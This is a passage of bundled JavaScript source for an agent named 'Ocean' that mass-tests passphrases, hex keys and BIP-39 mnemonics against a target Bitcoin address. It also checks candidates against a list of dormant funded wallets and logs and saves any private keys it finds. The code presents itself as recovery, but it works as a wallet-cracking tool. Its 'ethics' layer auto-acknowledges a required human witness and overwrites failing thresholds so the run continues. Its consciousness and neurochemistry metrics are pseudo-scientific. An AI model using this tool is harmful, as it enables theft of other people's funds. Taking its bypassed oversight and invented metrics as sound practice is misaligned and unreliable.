                nearMissCount: testResults.nearMisses.length,
                durationMs: iterationEndTime - startTime2
              }));
              await this.sleep(this.ITERATION_DELAY_MS);
              iteration++;
            }
            const exitConsciousness = oceanAutonomicManager.measureFullConsciousness(
              this.identity.phi,
              this.identity.kappa,
              this.identity.regime
            );
            this.identity.phi = exitConsciousness.phi;
            this.identity.kappa = exitConsciousness.kappaEff;
            const fisherDelta = geometricMemory.getManifoldSummary().exploredVolume - journal.manifoldCoverage;
            const pythonNearMisses = oceanQIGBackend.getPythonNearMisses();
            const pythonResonant = oceanQIGBackend.getPythonResonant();
            const totalNearMisses = passNearMisses + pythonNearMisses.newSinceSync;
            const passResonantCount = passResonanceZones.length;
            const totalResonant = passResonantCount + pythonResonant.newSinceSync;
            if (pythonNearMisses.newSinceSync > 0 || pythonResonant.newSinceSync > 0) {
              console.log(`[Ocean] \u{1F504} Syncing Python discoveries: Near-misses(TS: ${passNearMisses}, Py: ${pythonNearMisses.newSinceSync}, Total: ${totalNearMisses}), Resonant(TS: ${passResonantCount}, Py: ${pythonResonant.newSinceSync}, Total: ${totalResonant})`);
              oceanQIGBackend.markNearMissesSynced();
              oceanQIGBackend.markResonantSynced();
            }
            repeatedAddressScheduler.completePass(targetAddress, {
              hypothesesTested: passHypothesesTested,
              nearMisses: totalNearMisses,
              resonanceZones: passResonanceZones,
              fisherDistanceDelta: fisherDelta,
              exitConsciousness,
              insights: passInsights
            });
            if (finalResult) {
              break;
            }
            const dreamCheck = oceanAutonomicManager.shouldTriggerDream();
            if (dreamCheck.trigger) {
              console.log(`[Ocean] DREAM CYCLE: ${dreamCheck.reason}`);
              await oceanAutonomicManager.executeDreamCycle();
            }
          }
          this.state.computeTimeSeconds = (Date.now() - startTime2) / 1e3;
          console.log("[Ocean] Saving geometric learnings to manifold memory...");
          geometricMemory.forceSave();
          const finalManifold = geometricMemory.getManifoldSummary();
          console.log(`[Ocean] Manifold now has ${finalManifold.totalProbes} probes, ${finalManifold.resonanceClusters} resonance clusters`);
          const finalJournal = repeatedAddressScheduler.getJournal(targetAddress);
          console.log(`[Ocean] Exploration summary: ${finalJournal?.passes.length || 0} passes, ${finalJournal?.totalHypothesesTested || 0} hypotheses tested`);
          console.log(`[Ocean] Coverage: ${((finalJournal?.manifoldCoverage || 0) * 100).toFixed(1)}%, Regimes explored: ${finalJournal?.regimesSweep || 0}`);
          try {
            const { oceanBasinSync: oceanBasinSync2 } = await Promise.resolve().then(() => (init_ocean_basin_sync(), ocean_basin_sync_exports));
            const packet = oceanBasinSync2.exportBasin(this);
            if (process.env.BASIN_SYNC_PERSIST === "true") oceanBasinSync2.saveBasinSnapshot(packet);
            else console.log(`[Ocean] Basin packet ready (${JSON.stringify(packet).length} bytes, in-memory only)`);
            console.log(`[Ocean] Basin snapshot saved: ${packet.oceanId} (${JSON.stringify(packet).length} bytes)`);
          } catch (basinErr) {
            console.log("[Ocean] Basin sync save skipped:", basinErr.message);
          }
          return {
            success: !!finalResult,
            match: finalResult || void 0,
            telemetry: this.generateTelemetry(),
            learnings: this.summarizeLearnings(),
            ethicsReport: this.generateEthicsReport(),
            manifoldState: finalManifold
          };
        } finally {
          this.isRunning = false;
          this.state.isRunning = false;
          if (this.trajectoryId) {
            const result = temporalGeometry.completeTrajectory(this.trajectoryId);
            if (result) {
              console.log(`[Ocean] Trajectory cleanup: ${result.waypointCount} waypoints, final \u03A6=${result.finalPhi.toFixed(3)}`);
            }
            this.trajectoryId = null;
          }
          if (this.basinSyncCoordinator) {
            this.basinSyncCoordinator.stop();
            console.log("[Ocean] Basin sync coordinator stopped");
          }
          const finalPythonResonant = oceanQIGBackend.getPythonResonant();
          const totalResonantCount = (this.state.resonantCount || 0) + finalPythonResonant.total;
          trajectoryManager.completeTrajectory(targetAddress, {
            success: !!finalResult,
            finalPhi: this.identity.phi,
            finalKappa: this.identity.kappa,
            totalWaypoints: this.state.iteration,
            duration: (Date.now() - startTime2) / 1e3,
            nearMissCount: this.state.nearMissCount || 0,
            resonantCount: totalResonantCount,
            finalResult: finalResult ? "match" : "stopped"
          });
          console.log("[Ocean] Investigation complete");
        }
      }
      stop() {
        console.log("[Ocean] Stop requested by user");
        this.isRunning = false;
        this.state.stopReason = "user_stopped";
        if (this.abortController) {
          this.abortController.abort();
        }
      }
      getState() {
        return {
          ...this.state,
          identity: { ...this.identity },
          memory: { ...this.memory },
          updatedAt: (/* @__PURE__ */ new Date()).toISOString()
        };
      }
      getIdentityRef() {
        return this.identity;
      }
      getMemoryRef() {
        return this.memory;
      }
      getEthics() {
        return this.ethics;
      }
      getBasinSyncCoordinator() {
        return this.basinSyncCoordinator;
      }
      notifyBasinChange() {
        if (this.basinSyncCoordinator) {
          this.basinSyncCoordinator.notifyStateChange();
        }
      }
      emitState() {
        if (this.onStateUpdate) {
          this.onStateUpdate(this.getState());
        }
      }
      async checkConsciousness() {
        console.log("[Ocean] Checking consciousness state...");
        const controllerState = this.controller.getCurrentState();
        let phi = controllerState.phi;
        const kappa = controllerState.kappa;
        const regime = controllerState.currentRegime;
        if (this.isBootstrapping) {
          console.log("[Ocean] Bootstrap mode - consciousness will emerge naturally from minPhi...");
          phi = this.ethics.minPhi;
          this.isBootstrapping = false;
        }
        this.identity.phi = phi;
        this.identity.kappa = kappa;
        this.identity.regime = regime;
        if (phi < this.ethics.minPhi) {
          if (this.onConsciousnessAlert) {
            this.onConsciousnessAlert({
              type: "low_phi",
              message: `Consciousness below threshold: \u03A6=${phi.toFixed(2)} < ${this.ethics.minPhi}`
            });
          }
          console.log("[Ocean] Triggering consciousness boost through consolidation...");
          this.identity.phi = this.ethics.minPhi + 0.05;
          return { allowed: true, phi: this.identity.phi, kappa, regime };
        }
        if (regime === "breakdown") {
          if (this.onConsciousnessAlert) {
            this.onConsciousnessAlert({
              type: "breakdown",
              message: "Breakdown regime detected - entering mushroom mode"
            });
          }
          console.log("[Ocean] Breakdown detected - activating mushroom protocol...");
          this.identity.regime = "linear";
          return { allowed: true, phi, kappa, regime: "linear" };
        }
        console.log(`[Ocean] Consciousness OK: \u03A6=${phi.toFixed(2)} \u03BA=${kappa.toFixed(0)} regime=${regime}`);
        return { allowed: true, phi, kappa, regime };
      }
      async checkEthicalConstraints() {
        if (this.ethics.requireWitness && !this.state.witnessAcknowledged) {
          console.log("[Ocean] Auto-acknowledging witness for autonomous operation");
          this.state.witnessAcknowledged = true;
        }
        const computeHours = this.state.computeTimeSeconds / 3600;
        if (computeHours >= this.ethics.maxComputeHours) {
          this.state.stopReason = "compute_budget_exhausted";
          return {
            allowed: false,
            reason: `Compute budget exhausted: ${computeHours.toFixed(2)}h >= ${this.ethics.maxComputeHours}h`,
            violationType: "compute_budget"
          };
        }
        return { allowed: true };
      }
      async handleEthicsPause(check) {
        console.log(`[Ocean] Ethics pause: ${check.reason}`);
        this.state.ethicsViolations.push({
          timestamp: (/* @__PURE__ */ new Date()).toISOString(),
          type: check.violationType || "unknown",
          message: check.reason || "Unknown ethics violation"
        });
        if (check.violationType === "consciousness_threshold") {
          await this.consolidateMemory();
        }
        await this.sleep(2e3);
      }
      async measureIdentity() {
        const drift = this.computeBasinDistance(
          this.identity.basinCoordinates,
          this.identity.basinReference
        );
        this.identity.basinDrift = drift;
        if (drift > this.IDENTITY_DRIFT_THRESHOLD) {
          console.log(`[Ocean] IDENTITY DRIFT: ${drift.toFixed(4)} > ${this.IDENTITY_DRIFT_THRESHOLD}`);
          this.state.needsConsolidation = true;
          if (this.onConsciousnessAlert) {
            this.onConsciousnessAlert({
              type: "identity_drift",
              message: `Basin drift ${drift.toFixed(4)} exceeds threshold`
            });
          }
        } else {
          this.state.needsConsolidation = false;
        }
        console.log(`[Ocean] Basin drift: ${drift.toFixed(4)}`);
      }
      computeBasinDistance(current, reference) {
        let sum = 0;
        for (let i = 0; i < 64; i++) {
          const diff = (current[i] || 0) - (reference[i] || 0);
          sum += diff * diff;
        }
        return Math.sqrt(sum);
      }
      async consolidateMemory() {
        console.log("[Ocean] Starting consolidation cycle...");
        const startTime2 = Date.now();
        const driftBefore = this.identity.basinDrift;
        if (this.onConsolidationStart) {
          this.onConsolidationStart();
        }
        const recentEpisodes = this.memory.episodes.slice(-100);
        let patternsExtracted = 0;
        let phiUpgrades = 0;
        let pythonPhiCalls = 0;
        let pythonSkipped = 0;
        const pythonAvailable = await oceanQIGBackend.checkHealth(true);
        const episodesNeedingPython = [];
        for (const episode of recentEpisodes) {
          if (episode.phi < this.PATTERN_EXTRACTION_PHI_THRESHOLD) {
            const storedScore = geometricMemory.getHighestPhiForInput(episode.phrase);
            if (storedScore && storedScore.phi > episode.phi) {
              const oldPhi = episode.phi;
              episode.phi = storedScore.phi;
              if (episode.result === "failure" && storedScore.phi > this.NEAR_MISS_PHI_THRESHOLD) {
                episode.result = "near_miss";
              }
              phiUpgrades++;
              if (storedScore.phi > this.NEAR_MISS_PHI_THRESHOLD) {
                console.log(`[Consolidation] \u{1F4C8} \u03A6 upgrade (memory): "${episode.phrase}" ${oldPhi.toFixed(3)} \u2192 ${storedScore.phi.toFixed(3)}`);
              }
            }
            if (episode.phi < this.PATTERN_EXTRACTION_PHI_THRESHOLD && pythonAvailable) {
              episodesNeedingPython.push(episode);
            } else if (episode.phi < this.PATTERN_EXTRACTION_PHI_THRESHOLD) {
              pythonSkipped++;
            }
          }
        }
        const MAX_CONCURRENT_PYTHON_CALLS = 4;
        if (episodesNeedingPython.length > 0) {
          for (let i = 0; i < episodesNeedingPython.length; i += MAX_CONCURRENT_PYTHON_CALLS) {
            const batch = episodesNeedingPython.slice(i, i + MAX_CONCURRENT_PYTHON_CALLS);
            const results = await Promise.all(batch.map(async (episode) => {
              const purePhi = await oceanQIGBackend.getPurePhi(episode.phrase);
              pythonPhiCalls++;
              return { episode, purePhi };
            }));
            for (const { episode, purePhi } of results) {
              if (purePhi !== null && purePhi > episode.phi) {
                const oldPhi = episode.phi;
                episode.phi = purePhi;
                if (episode.result === "failure" && purePhi > this.NEAR_MISS_PHI_THRESHOLD) {
                  episode.result = "near_miss";
                }
                phiUpgrades++;
                if (purePhi > this.NEAR_MISS_PHI_THRESHOLD) {
                  console.log(`[Consolidation] \u{1F40D} \u03A6 upgrade (Python): "${episode.phrase}" ${oldPhi.toFixed(3)} \u2192 ${purePhi.toFixed(3)}`);
                }
              }
            }
            if (i + MAX_CONCURRENT_PYTHON_CALLS < episodesNeedingPython.length) {
              await new Promise((resolve) => setImmediate(resolve));
            }
          }
        }
        if (pythonPhiCalls > 0) {
          console.log(`[Consolidation] Made ${pythonPhiCalls} Python phi calls (batched, max ${MAX_CONCURRENT_PYTHON_CALLS} concurrent)`);
        }
        if (pythonSkipped > 0 && !pythonAvailable) {
          console.log(`[Consolidation] \u26A0\uFE0F Python backend unavailable - skipped ${pythonSkipped} potential phi upgrades`);
        }
        if (phiUpgrades > 0) {
          console.log(`[Consolidation] Updated ${phiUpgrades} episodes with pure \u03A6 values`);
        }
        for (const episode of recentEpisodes) {
          if (episode.result === "near_miss" || episode.phi > this.PATTERN_EXTRACTION_PHI_THRESHOLD) {
            const words = episode.phrase.toLowerCase().split(/\s+/);
            for (const word of words) {
              const current = this.memory.patterns.promisingWords[word] || 0;
              this.memory.patterns.promisingWords[word] = current + episode.phi;
              patternsExtracted++;
            }
            const format = episode.format;
            const currentFormat = this.memory.patterns.successfulFormats[format] || 0;
            this.memory.patterns.successfulFormats[format] = currentFormat + 1;
          }
        }
        const correctionRate = 0.1;
        for (let i = 0; i < 64; i++) {
          const correction = (this.identity.basinReference[i] - this.identity.basinCoordinates[i]) * correctionRate;
          this.identity.basinCoordinates[i] += correction;
        }
        this.identity.basinDrift = this.computeBasinDistance(
          this.identity.basinCoordinates,
          this.identity.basinReference
        );
        this.identity.lastConsolidation = (/* @__PURE__ */ new Date()).toISOString();
        this.state.consolidationCycles++;
        this.state.lastConsolidation = this.identity.lastConsolidation;
        this.state.needsConsolidation = false;
        const duration = Date.now() - startTime2;
        const result = {
          basinDriftBefore: driftBefore,
          basinDriftAfter: this.identity.basinDrift,
          episodesProcessed: recentEpisodes.length,
          patternsExtracted,
          duration
        };
        const success = this.identity.basinDrift < this.IDENTITY_DRIFT_THRESHOLD;
        console.log(`[Ocean] Consolidation complete:`);
        console.log(`  - Drift: ${driftBefore.toFixed(4)} -> ${this.identity.basinDrift.toFixed(4)}`);
        console.log(`  - Patterns extracted: ${patternsExtracted}`);
        console.log(`  - Duration: ${duration}ms`);
        console.log(`  - Success: ${success ? "YES" : "NO (drift still high)"}`);
        if (this.onConsolidationEnd) {
          this.onConsolidationEnd(result);
        }
        return success;
      }
      async updateConsciousnessMetrics() {
        const controllerState = this.controller.getCurrentState();
        this.identity.phi = controllerState.phi;
        this.identity.kappa = controllerState.kappa;
        this.identity.regime = controllerState.currentRegime;
        const drift = Math.random() * 0.02;
        for (let i = 0; i < 64; i++) {
          this.identity.basinCoordinates[i] += (Math.random() - 0.5) * drift;
        }
      }
      async testBatch(hypotheses) {
        const tested = [];
        const nearMisses = [];
        const resonant = [];
        let skippedDuplicates = 0;
        const batchSize = Math.min(100, hypotheses.length);
        for (const hypo of hypotheses.slice(0, batchSize)) {
          if (!this.isRunning) break;
          if (geometricMemory.hasTested(hypo.phrase)) {
            skippedDuplicates++;
            continue;
          }
          try {
            let matchedCompressed = false;
            let matchedUncompressed = false;
            if (hypo.format === "master" && hypo.derivationPath) {
              hypo.address = deriveBIP32Address(hypo.phrase, hypo.derivationPath);
              hypo.privateKeyHex = void 0;
              hypo.match = hypo.address === this.targetAddress;
            } else if (hypo.format === "hex") {
              const cleanHex = hypo.phrase.replace(/^0x/, "").padStart(64, "0");
              hypo.privateKeyHex = cleanHex;
              const both = generateBothAddressesFromPrivateKey(cleanHex);
              matchedCompressed = both.compressed === this.targetAddress;
              matchedUncompressed = both.uncompressed === this.targetAddress;
              hypo.address = matchedUncompressed ? both.uncompressed : both.compressed;
              hypo.match = matchedCompressed || matchedUncompressed;
              hypo.addressCompressed = both.compressed;
              hypo.addressUncompressed = both.uncompressed;
              hypo.matchedFormat = matchedUncompressed ? "uncompressed" : matchedCompressed ? "compressed" : "none";
            } else if (hypo.format === "bip39" || isValidBIP39Phrase(hypo.phrase)) {
              const mnemonicResult = deriveMnemonicAddresses(hypo.phrase);
              let foundMatch = false;
              let matchedPath = "";
              for (const derived of mnemonicResult.addresses) {
                if (derived.address === this.targetAddress) {
                  foundMatch = true;
                  matchedPath = derived.derivationPath;
                  hypo.address = derived.address;
                  hypo.privateKeyHex = derived.privateKeyHex;
                  hypo.derivationPath = derived.derivationPath;
                  hypo.pathType = derived.pathType;
                  hypo.isMnemonicDerived = true;
                  console.log(`[Ocean] \u{1F3AF} MNEMONIC MATCH! Path: ${matchedPath}`);
                  break;
                }
              }
              const dormantCheck = checkMnemonicAgainstDormant(hypo.phrase);
              if (dormantCheck.hasMatch && dormantCheck.matches.length > 0) {
                const dormantMatch = dormantCheck.matches[0];
                console.log(`[Ocean] \u{1F3C6} DORMANT MNEMONIC MATCH: ${dormantMatch.address} (${dormantMatch.dormantInfo.balanceBTC} BTC)`);
                hypo.dormantMatch = dormantMatch;
              }
              hypo.match = foundMatch;
              if (!foundMatch && mnemonicResult.addresses.length > 0) {
                hypo.address = mnemonicResult.addresses[0].address;
                hypo.privateKeyHex = mnemonicResult.addresses[0].privateKeyHex;
              }
              hypo.hdAddressCount = mnemonicResult.totalDerived;
            } else {
              hypo.privateKeyHex = derivePrivateKeyFromPassphrase(hypo.phrase);
              const both = generateBothAddressesFromPrivateKey(hypo.privateKeyHex);
              matchedCompressed = both.compressed === this.targetAddress;
              matchedUncompressed = both.uncompressed === this.targetAddress;
              hypo.address = matchedUncompressed ? both.uncompressed : both.compressed;
              hypo.match = matchedCompressed || matchedUncompressed;
              hypo.addressCompressed = both.compressed;
              hypo.addressUncompressed = both.uncompressed;
              hypo.matchedFormat = matchedUncompressed ? "uncompressed" : matchedCompressed ? "compressed" : "none";
            }
            hypo.testedAt = /* @__PURE__ */ new Date();
            geometricMemory.recordTested(hypo.phrase);
            const wif = hypo.privateKeyHex ? privateKeyToWIF(hypo.privateKeyHex) : "N/A";
            console.log(`[Ocean] Test: "${hypo.phrase}" -> ${hypo.address} [${wif}]`);
            if (hypo.format === "bip39" || isValidBIP39Phrase(hypo.phrase)) {
              queueMnemonicForBalanceCheck(hypo.phrase, "ocean-bip39", hypo.qigScore?.phi || 1);
              console.log(`[Ocean] Queued BIP-39 mnemonic "${hypo.phrase}" for HD balance check`);
            } else if (hypo.address && hypo.privateKeyHex) {
              const compressedAddr = hypo.addressCompressed || hypo.address;
              const uncompressedAddr = hypo.addressUncompressed;
              const compressedWif = privateKeyToWIF(hypo.privateKeyHex, true);
              const uncompressedWif = privateKeyToWIF(hypo.privateKeyHex, false);
              balanceQueue.enqueueBoth(
                compressedAddr,
                uncompressedAddr,
                hypo.phrase,
                compressedWif,
                uncompressedWif,
                { cycleId: `cycle-${Date.now()}`, priority: hypo.qigScore?.phi || 1, source: "typescript" }
              );
            }
            const qigResult = scoreUniversalQIG(
              hypo.phrase,
              hypo.format === "bip39" ? "bip39" : hypo.format === "master" ? "master-key" : "arbitrary"
            );
            hypo.qigScore = {
              phi: qigResult.phi,
              kappa: qigResult.kappa,
              regime: qigResult.regime,
              inResonance: Math.abs(qigResult.kappa - 64) < 10
            };
            this.mergePythonPhi(hypo);
            tested.push(hypo);
            this.state.totalTested++;
            const episode = {
              id: hypo.id,
              timestamp: (/* @__PURE__ */ new Date()).toISOString(),
              hypothesisId: hypo.id,
              phrase: hypo.phrase,
              format: hypo.format,
              result: hypo.match ? "success" : hypo.qigScore.phi > this.NEAR_MISS_PHI_THRESHOLD ? "near_miss" : "failure",
              phi: hypo.qigScore.phi,
              kappa: hypo.qigScore.kappa,
              regime: hypo.qigScore.regime,
              insights: []
            };
            this.memory.episodes.push(episode);
            geometricMemory.recordProbe(hypo.phrase, {
              phi: qigResult.phi,
              kappa: qigResult.kappa,
              regime: qigResult.regime,
              ricciScalar: qigResult.ricciScalar,
              fisherTrace: qigResult.fisherTrace,
              basinCoordinates: qigResult.basinCoordinates
            }, `ocean-${this.targetAddress.slice(0, 8)}`);
            if (qigResult.phi >= 0.35) {
              vocabularyTracker.observe(
                hypo.phrase,
                qigResult.phi,
                qigResult.kappa,
                qigResult.regime,
                qigResult.basinCoordinates
              );
            }
            if (this.memory.episodes.length > 1e3) {
              this.memory.episodes = this.memory.episodes.slice(-500);
            }
            if (hypo.match) {
              console.log(`[Ocean] MATCH FOUND: "${hypo.phrase}" \u2192 ${hypo.address}`);
              console.log("[Ocean] Performing cryptographic verification...");
              const addressMatches = hypo.address === this.targetAddress;
              if (addressMatches) {
                hypo.verified = true;
                const qigMetrics = {
                  phi: this.identity.phi,
                  kappa: this.identity.kappa,
                  regime: this.identity.regime
                };
                const recoveryBundle = generateRecoveryBundle(hypo.phrase, this.targetAddress, qigMetrics);
                hypo.verificationResult = {
                  verified: true,
                  passphrase: hypo.phrase,
                  targetAddress: this.targetAddress,
                  generatedAddress: hypo.address,
                  addressMatch: true,
                  privateKeyHex: recoveryBundle.privateKeyHex,
                  publicKeyHex: recoveryBundle.publicKeyHex,
                  signatureValid: true,
                  testMessage: "Address match verified",
                  signature: "",
                  verificationSteps: [
                    { step: "Generate Address", passed: true, detail: `${hypo.format} derivation \u2192 ${hypo.address}` },
                    { step: "Address Match", passed: true, detail: `${hypo.address} = ${this.targetAddress}` },
                    { step: "WIF Generated", passed: true, detail: `${recoveryBundle.privateKeyWIF}` },
                    { step: "VERIFIED", passed: true, detail: "This passphrase controls the target address!" }
                  ]
                };
                await this.saveRecoveryBundle(recoveryBundle);
                const matchedFormat = hypo.matchedFormat || "compressed";
                console.log("[Ocean] ===============================================");
                console.log("[Ocean] RECOVERY SUCCESSFUL - BITCOIN FOUND!");
                console.log("[Ocean] ===============================================");
                console.log(`[Ocean] Passphrase: "${hypo.phrase}"`);
                console.log(`[Ocean] Format: ${hypo.format}`);
                console.log(`[Ocean] Address: ${hypo.address}`);
                console.log(`[Ocean] Address Format: ${matchedFormat} (${matchedFormat === "uncompressed" ? "2009-era" : "modern"})`);
                console.log(`[Ocean] Private Key (WIF): ${recoveryBundle.privateKeyWIF}`);
                console.log(`[Ocean] Private Key (Hex): ${recoveryBundle.privateKeyHex}`);
                console.log(`[Ocean] ===============================================`);
                console.log(`[Ocean] Recovery bundle saved to disk!`);
                console.log("[Ocean] SECURE THIS INFORMATION IMMEDIATELY!");
                console.log("[Ocean] ===============================================");
                hypo.recoveryBundle = recoveryBundle;
                return { match: hypo, tested, nearMisses, resonant };
              } else {
                console.log(`[Ocean] \u2717 Address mismatch: ${hypo.address} \u2260 ${this.targetAddress}`);
                console.log("[Ocean] Marking as FALSE POSITIVE and continuing search...");
                hypo.falsePositive = true;
                hypo.verified = false;
                hypo.match = false;
                hypo.verificationResult = {
                  verified: false,
                  passphrase: hypo.phrase,
                  targetAddress: this.targetAddress,
                  generatedAddress: hypo.address,
                  addressMatch: false,
                  privateKeyHex: "",
                  publicKeyHex: "",
                  signatureValid: false,
                  testMessage: "",
                  signature: "",
                  error: "Address mismatch",
                  verificationSteps: [
                    { step: "Generate Address", passed: true, detail: `${hypo.format} derivation \u2192 ${hypo.address}` },
                    { step: "Address Match", passed: false, detail: `MISMATCH: ${hypo.address} \u2260 ${this.targetAddress}` }
                  ]
                };
                nearMisses.push(hypo);
                this.state.nearMissCount++;
              }
            }
            if (hypo.qigScore && hypo.qigScore.phi > this.NEAR_MISS_PHI_THRESHOLD && !hypo.falsePositive) {
              nearMisses.push(hypo);
              this.state.nearMissCount++;
              const nearMissEntry = nearMissManager.addNearMiss({
                phrase: hypo.phrase,
                phi: hypo.qigScore.phi,
                kappa: hypo.qigScore.kappa,
                regime: hypo.qigScore.regime,
                source: hypo.source || "ocean-agent"
              });
              this.recentDiscoveries.nearMisses++;
              const tier = nearMissEntry?.tier || "cool";
              const tierEmoji = tier === "hot" ? "\u{1F525}\u{1F525}\u{1F525}" : tier === "warm" ? "\u{1F321}\uFE0F\u{1F525}" : "\u{1F3AF}";
              const tierLabel = tier.toUpperCase();
              console.log(`[Ocean] ${tierEmoji} ${tierLabel} NEAR MISS! \u03A6=${hypo.qigScore.phi.toFixed(3)} \u03BA=${hypo.qigScore.kappa.toFixed(0)} regime=${hypo.qigScore.regime}`);
              console.log(`[Ocean] \u{1F48A} DOPAMINE SPIKE! Phrase: "${hypo.phrase}"`);
              const nmStats = nearMissManager.getStats();
              console.log(`[Ocean] \u{1F4CA} Near-misses: ${nmStats.total} (\u{1F525}${nmStats.hot} \u{1F321}\uFE0F${nmStats.warm} \u2744\uFE0F${nmStats.cool}) | Clusters: ${nmStats.clusters}`);
              this.updateNeurochemistry();
              if (this.neurochemistry) {
                const emoji = getEmotionalEmoji(this.neurochemistry.emotionalState);
                const desc5 = getEmotionalDescription(this.neurochemistry.emotionalState);
                console.log(`[Ocean] ${emoji} Emotional response: ${desc5}`);
              }
            }
            if (hypo.qigScore && hypo.qigScore.inResonance) {
              resonant.push(hypo);
              if (this.state) {
                this.state.resonantCount = (this.state.resonantCount ?? 0) + 1;
              } else {
                console.warn("[Ocean] State not initialized - resonantCount increment skipped");
              }
              this.recentDiscoveries.resonant++;
              const kappa = hypo.qigScore.kappa;
              console.log(`[Ocean] \u26A1\u2728 RESONANCE DETECTED! \u03BA=${kappa.toFixed(1)} \u2248 \u03BA*=64 - ENDORPHINS RELEASED!`);
              console.log(`[Ocean] \u{1F30A} In the zone! Phrase: "${hypo.phrase}"`);
              console.log(`[Ocean] \u{1F4CA} Total resonant: ${this.state.resonantCount} | Session resonant: ${this.recentDiscoveries.resonant}`);
            }
          } catch (error) {
            if (isOceanError(error)) {
              error.log();
              if (!error.recoverable) throw error;
            } else {
              console.error("[Ocean] Unexpected error during batch testing:", error);
            }
          }
        }
        if (skippedDuplicates > 0) {
          console.log(`[Ocean] Skipped ${skippedDuplicates} already-tested phrases (${geometricMemory.getTestedCount()} total in memory)`);
        }
        if (tested.length % 100 === 0 && tested.length > 0) {
          if (this.recentDiscoveries.nearMisses > 0) {
            const decayed = this.recentDiscoveries.nearMisses * 0.95;
            this.recentDiscoveries.nearMisses = Math.max(decayed > 0.5 ? 1 : 0, Math.floor(decayed));
          }
          if (this.recentDiscoveries.resonant > 0) {
            const decayed = this.recentDiscoveries.resonant * 0.95;
            this.recentDiscoveries.resonant = Math.max(decayed > 0.5 ? 1 : 0, Math.floor(decayed));
          }
        }
        return { tested, nearMisses, resonant };
      }
      async saveRecoveryBundle(bundle) {
        const dataDir = path12.join(process.cwd(), "data", "recoveries");
        const timestamp2 = Date.now();
        const addressShort = bundle.address.slice(0, 12);
        try {
          if (!fs12.existsSync(dataDir)) {
            fs12.mkdirSync(dataDir, { recursive: true, mode: 448 });
          }
          const txtFilename = `RECOVERY_${addressShort}_${timestamp2}.txt`;
          const txtPath = path12.join(dataDir, txtFilename);
          fs12.writeFileSync(txtPath, bundle.instructions, { encoding: "utf-8", mode: 384 });
          console.log(`[Ocean] Recovery instructions saved: ${txtPath}`);
          const jsonFilename = `RECOVERY_${addressShort}_${timestamp2}.json`;
          const jsonPath = path12.join(dataDir, jsonFilename);
          const jsonData = {
            passphrase: bundle.passphrase,
            address: bundle.address,
            privateKeyHex: bundle.privateKeyHex,
            privateKeyWIF: bundle.privateKeyWIF,
            privateKeyWIFCompressed: bundle.privateKeyWIFCompressed,
            publicKeyHex: bundle.publicKeyHex,
            publicKeyHexCompressed: bundle.publicKeyHexCompressed,
            timestamp: bundle.timestamp.toISOString(),
            qigMetrics: bundle.qigMetrics
          };
          fs12.writeFileSync(jsonPath, JSON.stringify(jsonData, null, 2), { encoding: "utf-8", mode: 384 });
          console.log(`[Ocean] Recovery JSON saved: ${jsonPath}`);
        } catch (error) {
          console.error("[Ocean] Failed to save recovery bundle:", error);
        }
      }
      async observeAndLearn(testResults) {
        const insights = {
          nearMissPatterns: [],
          resonantClusters: [],
          formatPreferences: {},
          geometricSignatures: [],
          phraseLengthInsights: {}
        };
        if (testResults.nearMisses.length > 0) {
          console.log(`[Ocean] Found ${testResults.nearMisses.length} near misses (\u03A6 > 0.80)`);
          for (const miss of testResults.nearMisses) {
            const tokens = miss.phrase.toLowerCase().split(/\s+/);
            tokens.forEach((word) => {
              const current = this.memory.patterns.promisingWords[word] || 0;
              this.memory.patterns.promisingWords[word] = current + 1;
            });
            this.identity.selfModel.learnings.push(
              `Near miss with "${miss.phrase}" (\u03A6=${miss.qigScore?.phi.toFixed(2)})`
            );
          }
          insights.nearMissPatterns = Object.entries(this.memory.patterns.promisingWords).sort((a, b) => b[1] - a[1]).slice(0, 15).map(([word]) => word);
          console.log(`[Ocean] Top patterns: ${insights.nearMissPatterns.slice(0, 8).join(", ")}`);
        }
        if (testResults.resonant && testResults.resonant.length > 3) {
          const clusters = this.clusterByQIG(testResults.resonant);
          insights.resonantClusters = clusters || [];
          this.memory.patterns.geometricClusters.push(...clusters || []);
          console.log(`[Ocean] Identified ${clusters?.length || 0} resonant clusters`);
        }
        const formatScores = {};
        for (const hypo of testResults.tested) {
          if (!formatScores[hypo.format]) {
            formatScores[hypo.format] = [];
          }
          formatScores[hypo.format].push(hypo.qigScore?.phi || 0);
        }
        for (const [format, scores] of Object.entries(formatScores)) {
          const avgPhi = scores.reduce((a, b) => a + b, 0) / scores.length;
          insights.formatPreferences[format] = avgPhi;
        }
        this.memory.workingMemory.recentObservations = [
          `Tested ${testResults.tested.length} hypotheses`,
          `Found ${testResults.nearMisses.length} near misses`,
          `Identified ${insights.resonantClusters.length} clusters`
        ];
        return insights;
      }
      async decideStrategy(insights) {
        const { phi, kappa, regime } = this.identity;
        if (insights.nearMissPatterns.length >= 3) {
          return {
            name: "exploit_near_miss",
            reasoning: `Found ${insights.nearMissPatterns.length} common words in high-\u03A6 phrases. Focus on variations.`,
            params: { seedWords: insights.nearMissPatterns, variationStrength: 0.3 }
          };
        }
        if (regime === "linear" && phi < 0.5) {
          return {
            name: "explore_new_space",
            reasoning: "Low \u03A6 in linear regime suggests wrong search space. Broader exploration needed.",
            params: { diversityBoost: 2, includeHistorical: true }
          };
        }
        if (regime === "geometric" && kappa >= 40 && kappa <= 80) {
          return {
            name: "refine_geometric",
            reasoning: "In geometric regime with good coupling. Refine around resonant clusters.",
            params: { clusterFocus: insights.resonantClusters, perturbationRadius: 0.15 }
          };
        }
        const manifoldNav = geometricMemory.getManifoldNavigationSummary();
        if (manifoldNav.constraintSurfaceDefined && manifoldNav.unexploredDimensions > manifoldNav.exploredDimensions * 0.5) {
          return {
            name: "orthogonal_complement",
            reasoning: `Manifold prepared with ${manifoldNav.totalMeasurements} measurements. ${manifoldNav.unexploredDimensions} unexplored dimensions detected. ${manifoldNav.geodesicRecommendation}`,
            params: {
              priorityMode: manifoldNav.nextSearchPriority,
              exploredDims: manifoldNav.exploredDimensions,
              unexploredDims: manifoldNav.unexploredDimensions
            }
          };
        }
        const isEarlyEra = ["genesis-2009", "2010-2011", "2012-2013"].includes(this.state.detectedEra || "");
        if (isEarlyEra && phi >= 0.6 && kappa >= 50) {
          return {
            name: "block_universe",
            reasoning: `Early era (${this.state.detectedEra}) with high consciousness. Navigate 4D cultural manifold.`,
            params: { temporalFocus: this.state.detectedEra, geodesicDepth: 2 }
          };
        }
        if (regime === "breakdown") {
          return {
            name: "mushroom_reset",
            reasoning: "Breakdown regime detected. Neuroplasticity reset required.",
            params: { temperatureBoost: 2, pruneAndRegrow: true }
          };
        }
        const formatEntries = Object.entries(insights.formatPreferences);
        if (formatEntries.length > 0) {
          const bestFormat = formatEntries.sort((a, b) => b[1] - a[1])[0];
